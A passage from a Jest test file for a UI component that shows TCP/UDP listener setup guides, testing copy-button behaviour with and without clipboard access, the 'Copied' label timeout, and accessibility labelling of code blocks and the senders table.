    expect(writeText).toHaveBeenLastCalledWith(pythonPre.textContent);
    expect(copyButtons().map(text)).toEqual(['Copy', 'Copied']);

    // The browser says no: select the text so the person can copy it by hand.
    writeText.mockRejectedValue(new DOMException('denied', 'NotAllowedError'));
    copyButtons()[0].click();
    await settle();
    expect(copyButtons().map(text)).toEqual(['Copy', 'Copy']);
    expect(document.activeElement).toBe(goPre);
    expect(window.getSelection()!.toString()).toBe(goPre.textContent);

    // No clipboard at all behaves the same.
    delete (navigator as unknown as Record<string, unknown>)['clipboard'];
    copyButtons()[1].click();
    await settle();
    expect(document.activeElement).toBe(pythonPre);
    expect(window.getSelection()!.toString()).toBe(pythonPre.textContent);
  });

  it('puts "Copied" back after a moment, so it never describes text that has changed since', async () => {
    jest.useFakeTimers();
    setClipboard({ writeText: jest.fn().mockResolvedValue(undefined) });
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json' }, detail: listening('tcp', 6000) }));

    copyButtons()[0].click();
    await settle();
    expect(copyButtons().map(text)).toEqual(['Copied', 'Copy', 'Copy']);
    jest.advanceTimersByTime(1900);
    await settle();
    expect(copyButtons().map(text)).toEqual(['Copied', 'Copy', 'Copy']);
    jest.advanceTimersByTime(200);
    await settle();
    expect(copyButtons().map(text)).toEqual(['Copy', 'Copy', 'Copy']);
  });

  it('labels code blocks and makes them focusable', () => {
    // Two guides on one page, as when two rows are open: their ids must not collide.
    const a = render(makeFeed({ id: 'plc-a', driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json' }, detail: listening('tcp', 6000) }));
    const aFixture = fixture;
    const b = render(makeFeed({ id: 'plc-b', driver: 'tcp', config: { mode: 'listen', port: 6001 }, detail: listening('tcp', 6001) }));
    const guides = [a, b];
    expect(aFixture).not.toBe(fixture);
    // TestBed leaves one fixture's root on the page; put both there, as two open rows are, so ids
    // resolve the way they do for a person using a screen reader.
    guides.forEach((guide) => document.body.appendChild(guide));

    const ids: string[] = [];
    let codeBlocks = 0;
    for (const guide of guides) {
      for (const pre of Array.from(guide.querySelectorAll('pre'))) {
        codeBlocks++;
        expect(pre.getAttribute('tabindex')).toBe('0');
        expect(pre.getAttribute('role')).toBe('region');
        const label = document.getElementById(pre.getAttribute('aria-labelledby')!);
        expect(label?.tagName).toBe('FIGCAPTION');
        expect(text(label)).toBeTruthy();
        // The label belongs to the same figure, so it names this block and not another guide's.
        expect(pre.closest('figure')!.contains(label)).toBe(true);
      }
      const section = guide.querySelector('section')!;
      const heading = document.getElementById(section.getAttribute('aria-labelledby')!);
      expect(heading?.tagName).toBe('H4');
      expect(section.contains(heading)).toBe(true);
      guide.querySelectorAll('[id]').forEach((n) => ids.push(n.id));
    }
    expect(codeBlocks).toBeGreaterThanOrEqual(4);
    expect(new Set(ids).size).toBe(ids.length);
    expect(ids.some((id) => id.includes('plc-a'))).toBe(true);
    expect(ids.some((id) => id.includes('plc-b'))).toBe(true);
    guides.forEach((guide) => guide.remove());

    // The senders table has a caption and column scopes.
    render(
      makeFeed({
        driver: 'udp',
        config: { port: 10110 },
        detail: listening('udp', 10110, { senders: [{ remote: '10.0.0.5', since: '', lastAt: '2026-10-18T10:00:05Z', messages: 1, connected: false }] }),
      }),
    );
    expect(el.querySelector('.senders caption')).not.toBeNull();
    expect(Array.from(el.querySelectorAll('.senders th')).every((th) => th.getAttribute('scope') === 'col')).toBe(true);
    // Each Copy button says which block it copies.
    render(makeFeed({ id: 'plc-c', driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000) }));
    for (const button of copyButtons()) {
      expect(button.getAttribute('aria-describedby')).toBe(button.closest('figure')!.querySelector('figcaption')!.id);
    }
  });

  it('renders nothing for a driver that is not tcp or udp', () => {
    render(makeFeed({ driver: 'opensky', config: {} }));
    expect(el.querySelector('section')).toBeNull();
  });
});
